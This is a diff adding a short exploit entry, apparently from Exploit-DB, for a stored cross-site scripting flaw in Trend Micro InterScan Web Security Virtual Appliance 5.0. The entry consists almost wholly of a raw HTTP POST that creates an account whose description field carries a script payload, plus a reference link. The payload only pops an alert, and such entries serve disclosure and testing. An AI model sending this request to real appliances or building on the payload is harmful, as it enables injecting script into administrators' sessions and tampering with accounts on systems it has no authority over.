@@ -1,0 +1,27 @@
+####################################################################################
+# Exploit Title: Permanent XSS in InterScan Web Security Virtual Appliance 5.0
+# Author: Ivan Huertas
+# Software Link: http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=249&regs=NABU&lang_loc=1
+# Version: 5.0
+# Tested on: Red Hat Nash 5.1
+# Code : 
+POST /login_account_add_modify.jsp HTTP/1.1
+Host: xx.xx.xx.xx:1812
+User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8)
+Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: xx.xx.xx.xx:1812
+Cookie: JSESSIONID=8466E24FDCCB840BDE17D972210DA20E
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+op=add&userid=consultor1&password_changed=true&PASS1=xxxx&PASS2=xxxx&desc=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&access_rights=reportonly
+####################################################################################
+
+http://www.exploit-db.com/sploits/14160.pdf
+
+ 
